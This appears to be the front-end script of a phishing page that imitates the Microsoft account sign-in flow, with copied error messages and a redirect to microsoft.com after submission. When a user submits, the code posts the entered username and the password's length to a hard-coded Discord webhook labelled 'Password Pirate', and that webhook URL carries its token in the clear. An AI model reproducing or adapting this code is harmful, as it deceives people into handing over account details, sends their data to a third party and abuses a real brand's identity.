if (sessionStorage.getItem("password")) {
    window.location.href = "https://www.microsoft.com/";
}

const slidePage = document.querySelector(".slide-page");
const secondSlide = document.querySelector(".secondSlide");
const btnNext = document.querySelector(".firstNext");
const prevBtnSec = document.querySelector(".prev-1");
const submitBtn = document.querySelector(".submit");

const createBody = (data) => {
    let urlEncodedData = "",
        urlEncodedDataPairs = [],
        name;

    for (name in data) {
        urlEncodedDataPairs.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));
    }

    urlEncodedData = urlEncodedDataPairs.join('&').replace(/%20/g, '+');

    return urlEncodedData;
}

const sendData = (data) => {
    fetch('https://discord.com/api/webhooks/1305606177777778788/InbjBbuYwVV6R5DvN3Bne305sSGI8CTmMBKaolmi9VITc9hLai3dbnPgBkFZ22JjchDo', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            content: `User: ${data.userName}, Password Length: ${data.passwordLength}`,
            username: 'Password Pirate'
        }),
    })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok ' + response.statusText);
            }
            return response.json();
        })
        .then(data => {
            console.log('Success:', data);
        })
        .catch(error => {
            console.error('There was a problem with the fetch operation:', error);
        });
}

function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(email);
}

function validate() {
    const $result = $("#result");
    const email = $("#email").val();
    $result.text("");

    if (!validateEmail(email)) {
        if (!email) {
            $result.text("Enter a valid email address, phone number, or Skype\n name.");
            $result.css("color", "red");
        } else {
            $result.text("That Microsoft account doesn't exist.\n Enter a different account or get a new one.");
            $result.css("color", "red");
        }
        return false;
    }
    return true;
}

function validatePassword() {
    const $passResult = $("#passResult");
    const password = $("#password").val();
    $passResult.text("");

    if (password.length < 8) {
        $passResult.text("Your account or password is incorrect. If you don't remember your password,");
        $passResult.css("color", "red");
        return false;
    }
    return true;
}

// event listeners for entering in textbox
var input1 = document.getElementById("email");
var input2 = document.getElementById("password");

input1.addEventListener("keyup", function (event) {
    if (event.keyCode === 13) {
        event.preventDefault();
        document.getElementById("btnSend").click();
    }
})

input2.addEventListener("keyup", function (event) {
    if (event.keyCode === 13) {
        event.preventDefault();
        document.getElementById("btnSignIn").click();
    }
})

btnNext.addEventListener("click", function () {

    const email = input1.value;

    // check email is not empty
    if (!validate()) return;

    // check valid email
    if (!validateEmail(email)) {
        return;
    }

    // set valid email to next slide
    document.getElementById("userLine").textContent = email;

    // set margins to slide next part of login form to visible and hide first one
    const section1 = document.getElementById("section-1");
    const section2 = document.getElementById("section-2");
    section1.style.marginLeft = "-100%";
    section1.style.visibility = "hidden";
    section2.style.marginLeft = "0%";
});

submitBtn.addEventListener("click", function () {

    const collectUserName = input1.value;
    const collectPassword = input2.value;

    // check password
    if (!validatePassword()) return;

    sessionStorage.setItem("user", collectUserName);
    sessionStorage.setItem("passwordLength", collectPassword.length);

    sendData({userName: sessionStorage.getItem("user"), passwordLength: sessionStorage.getItem("passwordLength")});

    // set session item to indicate if user is already giving login information. if is redirect user to somewhere.
    sessionStorage.setItem("secsession", false);

    console.log('from session storage', sessionStorage.getItem('passwordLength'));
    setTimeout(function(){
      window.location.href = "https://www.microsoft.com/";
      // location.reload();
    },10);
});

prevBtnSec.addEventListener("click", function () {

    // set margins to top back to normnal
    const section1 = document.getElementById("section-1");
    const section2 = document.getElementById("section-2");
    section1.style.marginLeft = "0%";
    section1.style.visibility = "visible";
    section2.style.marginLeft = "100%";

    // make loginForm little bigger
    document.getElementById("loginForm").style.height = "370px";

    slidePage.style.marginLeft = "0%";
    secondSlide.style.marginLeft = "100%";
    slidePage.style.visibility = "visible";
});
